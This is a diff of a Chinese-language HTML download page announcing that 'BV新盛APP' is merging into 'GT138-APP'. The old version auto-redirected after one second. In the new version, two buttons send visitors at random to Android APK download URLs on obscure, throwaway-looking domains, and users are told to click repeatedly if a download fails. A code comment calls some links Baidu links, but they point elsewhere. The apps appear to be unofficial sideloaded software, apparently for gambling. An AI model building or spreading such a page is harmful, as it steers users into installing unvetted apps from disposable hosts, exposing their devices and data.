@@ -1,32 +1,165 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <title>正在下载</title>
-    <script>
-        // 定义要随机跳转的3个网页地址
-        const urls = [
-            "https://jt-asia.katechilko.com/apk/xs-origin-503.apk",  // 第一个跳转地址
-            "https://comisrzmi.cnzyzl.cn/Dos/d/c/qjedSwu8LweKGNLK", 
-            "https://teiak5gl3q3577.com/",
-            // 第二个跳转地址
-        ];
-        
-        // 生成随机索引（0、1、2中的一个）
-        const randomIndex = Math.floor(Math.random() * urls.length);
-        
-        // 获取随机选中的地址
-        const targetUrl = urls[randomIndex];
-        
-        // 设置延迟1秒后跳转（可根据需要调整延迟时间，单位毫秒）
-        setTimeout(() => {
-            window.location.href = targetUrl;
-        }, 1000);
-    </script>
-</head>
-<body>
-    未自动下载，请点击以下链接：<br>
-    <a href="https://teiak5gl3q3577.com/">链接</a><br>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>下载</title>
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
 
+body {
+  width: 100vw;
+  min-height: 100vh;
+  overflow: hidden;
+  background: linear-gradient(135deg, #0d0221, #2d1b69, #ff2a6d, #05d9e8);
+  background-size: 400% 400%;
+  animation: bgGradient 12s ease infinite;
+  font-family: "Segoe UI", sans-serif;
+  position: relative;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+}
+
+/* 背景渐变动画 */
+@keyframes bgGradient {
+  0% { background-position: 0% 50%; }
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
+}
+
+/* 星星光点容器 */
+.stars {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  pointer-events: none;
+}
+
+.star {
+  position: absolute;
+  background: rgba(255, 255, 255, 0.8);
+  border-radius: 50%;
+  animation: float 6s infinite ease-in-out;
+}
+
+@keyframes float {
+  0% { transform: translateY(0) translateX(0); opacity: 0; }
+  10% { opacity: 1; }
+  90% { opacity: 1; }
+  100% { transform: translateY(-100vh) translateX(20px); opacity: 0; }
+}
+
+/* 标题 */
+.title {
+  font-size: 32px;
+  color: #fff;
+  text-shadow: 0 0 10px #05d9e8, 0 0 20px #ff2a6d;
+  margin-bottom: 60px;
+  letter-spacing: 2px;
+}
+
+/* 按钮组 */
+.btn-box {
+  display: flex;
+  gap: 40px;
+}
+
+.btn {
+  width: 180px;
+  height: 55px;
+  border: none;
+  border-radius: 8px;
+  font-size: 16px;
+  font-weight: bold;
+  letter-spacing: 1px;
+  cursor: pointer;
+  position: relative;
+  overflow: hidden;
+  transition: 0.3s;
+  color: #fff;
+  background: rgba(0, 0, 0, 0.3);
+  backdrop-filter: blur(6px);
+}
+
+.btn-left {
+  box-shadow: 0 0 12px #05d9e8, inset 0 0 8px #05d9e8;
+  border: 1px solid #05d9e8;
+}
+
+.btn-right {
+  box-shadow: 0 0 12px #ff2a6d, inset 0 0 8px #ff2a6d;
+  border: 1px solid #ff2a6d;
+}
+
+.btn:hover {
+  transform: scale(1.08);
+}
+
+.btn:active {
+  transform: scale(0.98);
+}
+</style>
+</head>
+
+<body>
+<div class="stars" id="stars"></div>
+<div class="title">重磅消息<br></div>
+<div class="title">BV新盛APP将合并至GT138-APP<br></div>
+<div class="title">请点击下方按钮（随机下载）</div>
+<div class="btn-box">
+  <button class="btn btn-left" id="left">BV新盛安卓下载</button>
+  <button class="btn btn-right" id="right">GT138安卓下载</button>
+</div>
+<div class="title">要是下载失败请多点击几次</div>
+<script>
+// 生成漂浮星星
+function createStars() {
+  const stars = document.getElementById('stars');
+  const count = 60;
+  for (let i = 0; i < count; i++) {
+    const star = document.createElement('div');
+    star.classList.add('star');
+    const size = Math.random() * 3 + 1;
+    star.style.width = size + 'px';
+    star.style.height = size + 'px';
+    star.style.left = Math.random() * 100 + '%';
+    star.style.top = Math.random() * 100 + '%';
+    star.style.animationDelay = Math.random() * 6 + 's';
+    star.style.animationDuration = (Math.random() * 4 + 4) + 's';
+    stars.appendChild(star);
+  }
+}
+createStars();
+
+// 左侧链接（原3条）
+const leftUrls = [
+  "https://jt-asia.katechilko.com/apk/xs-origin-503.apk",
+  "https://comisrzmi.cnzyzl.cn/Dos/d/c/qjedSwu8LweKGNLK",
+  "https://appp.wjvwefdbd.com/"
+];
+
+// 右侧链接（3个百度）
+const rightUrls = [
+  "https://download.138dld.com/download/download_android",
+  "https://download.138dld.com/mobile_download/",
+  "https://download.138dld.com/mobile_download/"
+];
+
+function jump(links) {
+  const idx = Math.floor(Math.random() * links.length);
+  window.location.href = links[idx];
+}
+
+document.getElementById('left').onclick = () => jump(leftUrls);
+document.getElementById('right').onclick = () => jump(rightUrls);
+</script>
 </body>
 </html>
